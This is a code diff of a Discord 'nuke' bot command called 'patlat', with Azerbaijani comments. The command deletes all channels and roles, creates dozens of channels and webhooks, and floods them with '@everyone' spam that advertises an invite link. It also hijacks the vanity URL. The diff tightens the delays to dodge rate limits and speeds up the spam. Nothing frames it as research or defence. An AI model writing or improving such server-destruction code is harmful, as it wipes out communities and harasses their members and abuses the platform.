@@ -173,7 +173,7 @@ async def patlat(ctx):
     for channel in guild.channels:
         try: 
             await channel.delete()
-            await asyncio.sleep(0.05)
+            await asyncio.sleep(0.04)
         except: continue
 
     # 2. Bütün rolları sil
@@ -181,7 +181,7 @@ async def patlat(ctx):
         if role.name != "@everyone" and role < guild.me.top_role:
             try: 
                 await role.delete()
-                await asyncio.sleep(0.05)
+                await asyncio.sleep(0.04)
             except: continue
 
     # 3. Emojiləri və Stickerləri sil
@@ -216,45 +216,52 @@ async def patlat(ctx):
         except: pass
         await asyncio.sleep(0.02)
 
-    # 7. TƏHLÜKƏSİZ VƏ NÖVBƏLİ KANAL AÇILIŞI (Rate-limitə düşməmək üçün)
-    created_channels = []
-    for i in range(1, 41): # 40 kanal optimal və qüsursuz işləməsi üçündür
+    # 7. Kanalları bir-bir yaradıb dərhal içini doldurmaq
+    for i in range(1, 31): # 30 ədəd kanal
         try:
-            c = await guild.create_text_channel(name=f"244-{i}")
-            created_channels.append(c)
-            await asyncio.sleep(0.12)
+            channel = await guild.create_text_channel(name=f"244-{i}")
+            await asyncio.sleep(0.1)
+            
+            # Hər kanalda 1 ədəd tək webhook yaradırıq
+            wh = None
+            try:
+                wh = await channel.create_webhook(name="244-WH")
+                await asyncio.sleep(0.1)
+            except:
+                pass
+
+            # Həm bot özü, həm də webhook növbəli şəkildə sürətli yazır
+            for _ in range(35):
+                tasks_list = []
+                if wh:
+                    tasks_list.append(wh.send("@everyone discord.gg/244 YAZ GİR OQL"))
+                tasks_list.append(channel.send("@everyone discord.gg/244 YAZ GİR OQL"))
+                
+                try:
+                    await asyncio.gather(*tasks_list)
+                except:
+                    pass
+                await asyncio.sleep(0.05)
+                
         except: 
             break
 
-    # 8. HƏR KANALDA RAHAT VƏ DAYANMADAN İŞLƏYƏN WEBHOOK AXINI
-    for channel in created_channels:
-        try:
-            wh = await channel.create_webhook(name="244-WH")
-            for _ in range(25):
-                await wh.send("@everyone discord.gg/244 YAZ GİR OQL")
-                await asyncio.sleep(0.08)
-        except: 
-            try:
-                for _ in range(15):
-                    await channel.send("@everyone discord.gg/244 YAZ GİR OQL")
-                    await asyncio.sleep(0.08)
-            except: pass
-
-    # 9. Vanity URL tənzimləmə
+    # 8. Vanity URL tənzimləmə
     try:
         if guild.premium_tier >= 2:
             await guild.edit(vanity_code="244")
     except: pass
 
-    # 10. Ən sonda zəmanətli şəkildə xüsusi kanalın yaradılması
+    # 9. Ən sonda zəmanətli şəkildə "ruhum-tanrı" kanalının yaradılması
     try:
         final_channel = await guild.create_text_channel(name="ruhum-tanrı")
-        await asyncio.sleep(0.5)
-        for _ in range(20):
+        await asyncio.sleep(0.3)
+        for _ in range(25):
             await final_channel.send("@everyone RUHUM SKDI GAGAS — discord.gg/244")
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(0.08)
     except Exception as e:
         print(f"Kanal yaratma xətası: {e}")
+            
 
 
 # ==============================================================================
